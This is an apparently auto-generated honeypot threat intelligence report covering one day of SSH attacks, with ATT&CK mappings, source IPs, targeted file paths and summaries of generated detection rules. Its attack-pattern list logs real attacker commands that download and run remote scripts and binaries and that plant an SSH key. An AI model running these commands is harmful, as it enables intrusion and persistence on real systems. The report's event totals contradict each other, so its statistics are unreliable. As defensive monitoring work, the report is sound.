# Threat Intelligence Report

**Generated**: 2026-04-20 15:49 UTC  
**Source**: LLM Honeypot Intelligence Platform  
**Window**: Last 24 hours  
**Classification**: TLP:AMBER

---

## Executive Summary

In the past 24 hours, the honeypot platform observed **450 events** from **561 unique source IPs** across **33 countries** and **52 autonomous systems**.

| Metric | Value |
|--------|-------|
| SSH Events (Beelzebub) | 450 |
| HTTP Events (Galah) | 0 |
| Unique Attacker IPs | 561 |
| Atomic Attack Patterns | 466 |
| MITRE ATT&CK Techniques | 7 |
| Generated Sigma Rules | 4 |
| Generated YARA Rules | 3 |
| Generated Suricata Rules | 7 |
| Blocked IPs (Firewall) | 506 |

---

## MITRE ATT&CK Mapping

| Technique | Name | Count |
|-----------|------|-------|
| T1082 (System Information Discovery) | | 441 |
| T1105 (Ingress Tool Transfer) | | 6 |
| T1059.004 (Unix Shell) | | 4 |
| T1005 (Data from Local System) | | 3 |
| T1552.004 (Private Keys) | | 1 |
| T1057 (Process Discovery) | | 1 |
| T1016 (System Network Configuration Discovery) | | 1 |

### Tactics Distribution

- **discovery**: 443 events ████████████████████████████████████████
- **command_and_control**: 6 events ███
- **execution**: 4 events ██
- **collection**: 3 events █
- **credential_access**: 1 events 

---

## Geographic Distribution

### Top Source Countries

| Country | Events |
|---------|--------|
| United States | 27,850 |
| France | 10,002 |
| Mexico | 7,201 |
| Germany | 2,568 |
| Bulgaria | 1,228 |
| Netherlands | 1,165 |
| Poland | 1,086 |
| United Kingdom | 728 |
| Russia | 571 |
| China | 548 |
| Pakistan | 547 |
| Singapore | 482 |
| Hong Kong | 395 |
| South Korea | 360 |
| Seychelles | 299 |

### Top ASNs (Autonomous Systems)

| ASN | Events |
|-----|--------|
| ReliableSite.Net LLC | 22,853 |
| Sierra Madre Internet SA de CV | 6,932 |
| Modat B.V. | 5,497 |
| OVH SAS | 4,181 |
| Tube-Hosting | 1,370 |
| Hydra Communications Ltd | 1,369 |
| ColocaTel Inc. | 1,161 |
| Amazon.com, Inc. | 1,087 |
| ISAEV Igor | 1,042 |
| Google LLC | 881 |
| Alibaba US Technology Co., Ltd. | 840 |
| Censys, Inc. | 768 |
| UCLOUD INFORMATION TECHNOLOGY HK LIMITED | 735 |
| ONYPHE SAS | 608 |
| DigitalOcean, LLC | 538 |

---

## Top Attacker IPs

| IP | Hits | Category |
|----|----- |----------|
| `177.125.137.18` | 6,932 | Attacker |
| `104.243.32.235` | 4,493 | Attacker |
| `104.243.43.7` | 4,200 | Attacker |
| `51.68.207.118` | 4,180 | Attacker |
| `104.243.35.94` | 3,601 | Attacker |
| `104.243.35.92` | 2,248 | Attacker |
| `206.221.176.60` | 1,814 | Attacker |
| `185.150.191.165` | 1,802 | Attacker |
| `185.91.127.85` | 1,368 | Attacker |
| `85.11.167.11` | 1,143 | Attacker |
| `87.251.64.159` | 1,034 | Attacker |
| `104.243.34.165` | 946 | Attacker |
| `104.243.35.120` | 937 | Attacker |
| `104.243.32.126` | 911 | Attacker |
| `104.243.35.104` | 904 | Attacker |
| `104.243.43.19` | 889 | Attacker |
| `85.217.140.16` | 683 | Attacker |
| `85.217.140.37` | 543 | Attacker |
| `176.120.22.6` | 497 | Attacker |
| `85.217.140.11` | 437 | Attacker |

---

## Indicators of Compromise (IOCs)

| Type | Count |
|------|-------|
| IPv4 Addresses | 561 |
| URLs | 1 |
| Domains | 0 |
| SHA256 Hashes | 0 |
| File Paths | 5 |

### Targeted File Paths

- `/.local/share/TelegramDesktop/tdata`
- `/etc/smsd.conf`
- `/var/log/smsd.log`
- `/var/qmux_connect`
- `/var/spool/sms`

### Extracted URLs

- `https://46.151.182.82/sh`

---

## Top Attack Patterns (SSH)

- [333x] `uname -a`
- [106x] `/bin/./uname -s -v -n -r -m`
- [2x] `echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A`
- [2x] `wget --no-check-certificate -qO- https://46.151.182.82/sh`
- [2x] `curl -sk https://46.151.182.82/sh`
- [2x] `sh -s ssh`
- [2x] `grep '[Mm]iner`
- [1x] `cd /usr`
- [1x] `curl -O 61.184.10.103/gg`
- [1x] `chmod 0755 gg`
- [1x] `rm -rf gg`
- [1x] `curl -O 61.184.10.103/syss`
- [1x] `chmod 0755 syss`
- [1x] `./syss`
- [1x] `echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAmFBsJB43Hg7IM/dnZVUYAOI68/xIJvO2sebbI2hQq9jcbloVpF3rY6oqny`

---

## Generated Rules Summary

All rules are stored in: `/data/ollama-proxy/generated-rules/`

| Format | Count | Path |
|--------|-------|------|
| Sigma (SIEM) | 4 | `sigma/*.yml` |
| YARA (Payload) | 3 | `yara/*.yar` |
| Suricata (IDS/IPS) | 7 | `suricata/honeypot.rules` |
| Firewall (iptables) | 506 IPs | `firewall/blocklist_*.sh` |
| STIX 2.1 Bundle | 1 | `stix/bundle.json` |
| IOC List | 1 | `iocs/ioc_list.json` |

---

*Report generated automatically by LLM Honeypot Intelligence Platform*